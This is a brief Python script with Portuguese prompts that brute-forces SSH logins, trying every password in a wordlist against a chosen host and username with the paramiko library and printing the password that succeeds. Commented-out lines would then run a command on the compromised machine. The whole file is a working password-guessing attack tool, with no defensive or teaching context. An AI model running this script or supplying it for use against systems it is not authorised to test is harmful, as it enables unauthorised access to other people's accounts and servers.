#!/usr/bin/python3
import paramiko

host = input("Entre com host ou IP para conexao SSH: ")
port = input("Entre com a porta (padrao: 22): ")
user = input("Entre com o usuario a ser testado: ")
#list_user = input("Entre com a wordlist de usuarios: ")
list_pass = input("Entre com a wordlist de senhas: ")

#lu = open(list_user)
lp = open(list_pass)

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.load_system_host_keys()

for line_pass in lp.readlines():
    senha = line_pass.strip()

    try:
        ssh.connect(host, port=port, username=user, password=senha)
    except paramiko.ssh_exception.AuthenticationException:
        print("Testando com a senha:",senha)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Conexao nao validada!")
        break
    except FileNotFoundError:
        print("Wordlist nao encontrada!")
    else:
        print("[+] Senha encontrada ===>", senha)
        break
        # stdin, stdout, stderr = ssh.exec_command("id")
        # for linha in stdout.readlines():
        #     print(linha.strip())

ssh.close()